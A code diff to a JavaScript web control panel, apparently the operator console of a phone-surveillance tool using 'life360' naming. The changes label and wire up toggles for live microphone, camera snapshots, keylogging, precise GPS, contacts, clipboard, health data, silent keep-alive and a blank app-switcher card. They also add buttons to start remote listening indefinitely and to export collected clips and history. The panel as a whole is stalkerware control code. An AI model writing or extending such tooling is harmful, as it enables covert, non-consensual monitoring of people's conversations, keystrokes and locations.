@@ -375,26 +375,39 @@ handle(m);
 function __msg(j) { onmessage({ data: typeof j === 'string' ? j : JSON.stringify(j) }); }
 function __bin(s) { onmessage({ data: b64(s).buffer }); }
 
-var KEYS = ['calls','camera','location','preciseLocation','keylog','voiceActivity','clipCapture','liveStream','photoLibrary','contacts','calendar','reminders','clipboard','motion','batteryState','health','wifiInfo','geofence','screenTime','heartbeat','schedule','storageAndForward','history','pushAlerts','keyboardTrigger','encryption','watching','blankSnapshot'];
+var KEYS = [
+['mic','Live mic'],['camera','Camera snapshots'],['location','Location'],
+['preciseLocation','Precise GPS'],['keylog','Keyboard keylog'],['voiceActivity','Voice activity'],
+['clipCapture','Save audio clips'],['liveStream','Live audio stream'],['photoLibrary','Photo library'],
+['contacts','Contacts'],['calendar','Calendar'],['reminders','Reminders'],['clipboard','Clipboard'],
+['motion','Motion context'],['batteryState','Battery state'],['health','Health data'],
+['wifiInfo','Wi-Fi name'],['geofence','Geofence alerts'],['screenTime','Screen Time'],
+['silentKeepAlive','Silent keep-alive'],['schedule','Scheduling'],['storeAndForward','Store & forward'],
+['history','History log'],['pushAlerts','Push alerts'],['keywordTriggers','Keyword triggers'],
+['encryption','Encrypt payloads'],['watchdog','Watchdog'],['blankSnapshot','Blank switcher card']
+];
 var savedVals = lsGet('l360.toggles', {});
 var toggles = document.getElementById('toggles');
-KEYS.forEach(function (k) {
+KEYS.forEach(function (p) {
 var l = document.createElement('label');
 l.className = 'tgl';
 var i = document.createElement('input');
 i.type = 'checkbox';
-i.dataset.k = k;
-i.checked = savedVals[k] === true;
+i.dataset.k = p[0];
+i.checked = savedVals[p[0]] === true;
 i.onchange = function () {
 var vals = {};
 document.querySelectorAll('#toggles input').forEach(function (x) { vals[x.dataset.k] = x.checked; });
 lsSet('l360.toggles', vals);
 send({ type: 'settings', values: vals });
+setStatus('sent ' + p[0] + ' = ' + (i.checked ? 'on' : 'off'));
 };
 l.appendChild(i);
-l.appendChild(document.createTextNode(' ' + k));
+l.appendChild(document.createTextNode(' ' + p[1]));
 toggles.appendChild(l);
 });
+
+function act(label, o) { send(o); setStatus('sent ' + label); }
 
 document.getElementById('addPlace').onclick = function () {
 if (!last) { setStatus('no fix yet'); return; }
@@ -407,27 +420,42 @@ renderPlaces();
 setStatus('fence saved: ' + nm);
 };
 
+var listening = false;
+function paintListen() {
+document.getElementById('unlock').textContent = listening ? 'Stop listening' : 'Tap to Listen/Unlock';
+document.getElementById('livebar').style.display = listening ? 'flex' : 'none';
+}
 document.getElementById('unlock').onclick = function () {
 if (ac && ac.state === 'suspended') ac.resume();
-document.getElementById('livebar').style.display = 'flex';
-send({ type: 'cmd', cmd: 'unlock' });
+listening = !listening;
+paintListen();
+send({ type: 'cmd', cmd: listening ? 'listen' : 'stopListen', seconds: 300 });
+setStatus(listening ? 'listening' : 'stopped');
 };
-document.getElementById('listen').onclick = function () { send({ type: 'cmd', cmd: 'listen', seconds: 300 }); };
+document.getElementById('listen').onclick = function () {
+listening = true; paintListen();
+act('listen', { type: 'cmd', cmd: 'listen', seconds: 300 });
+};
 var holding = false;
 document.getElementById('hold').onclick = function () {
 holding = !holding;
 document.getElementById('hold').textContent = holding ? 'Hold ON' : 'Hold';
 send({ type: 'cmd', cmd: holding ? 'listen' : 'stopListen', seconds: -1 });
+setStatus(holding ? 'holding' : 'released');
 };
-document.getElementById('snap').onclick = function () { send({ type: 'cmd', cmd: 'snap' }); };
-document.getElementById('flip').onclick = function () { send({ type: 'cmd', cmd: 'front' }); };
-document.getElementById('micMode').onchange = function (e) { send({ type: 'settings', micMode: e.target.value }); };
+document.getElementById('snap').onclick = function () { act('snap', { type: 'cmd', cmd: 'snap' }); };
+document.getElementById('flip').onclick = function () { act('flip', { type: 'cmd', cmd: 'front' }); };
+document.getElementById('micMode').onchange = function (e) {
+send({ type: 'settings', micMode: e.target.value });
+setStatus('mic mode ' + e.target.value);
+};
 
 document.getElementById('devSel').onchange = function (e) {
 state.sel = e.target.value;
 lsSet('l360.sel', state.sel);
 renderAlerts(); renderLog(); renderClips();
 };
+
 document.getElementById('export').onclick = function () {
 var name = 'life360-history-' + stamp() + '.json';
 var text = JSON.stringify({ exported: new Date().toISOString(), devices: state.devs, places: places, alerts: state.alerts, clips: state.clips.map(function (c) { return { t: c.t, name: c.name, d: c.d, url: c.url }; }), log: state.log }, null, 1);
@@ -443,12 +471,19 @@ else { var a = document.createElement('a'); a.href = 'data:image/jpeg;base64,' +
 document.getElementById('clear').onclick = function () {
 state.alerts = []; state.clips = []; state.log = [];
 persist(); renderAlerts(); renderLog(); renderClips();
+setStatus('feed cleared');
 };
 
 window.__upd = function (s) { setStatus(s); };
-document.getElementById("update").onclick = function () { if (!B || !B.checkUpdate) { setStatus("no updater"); return; } setStatus("checking..."); B.checkUpdate(); };
-if (B && B.version) { setStatus("build " + B.version().slice(0, 7)); } else { setStatus("NO BRIDGE"); }
+document.getElementById('update').onclick = function () {
+if (!B || !B.checkUpdate) { setStatus('no updater'); return; }
+setStatus('checking...');
+B.checkUpdate();
+};
+
 renderDevs(); renderAlerts(); renderLog(); renderClips(); renderPlaces();
+if (B && B.version) { setStatus('build ' + B.version().slice(0, 7)); } else { setStatus('NO BRIDGE'); }
+send({ type: 'cmd', cmd: 'state' });
 setTimeout(function () { map.invalidateSize(); }, 200);
 </script>
 </body>
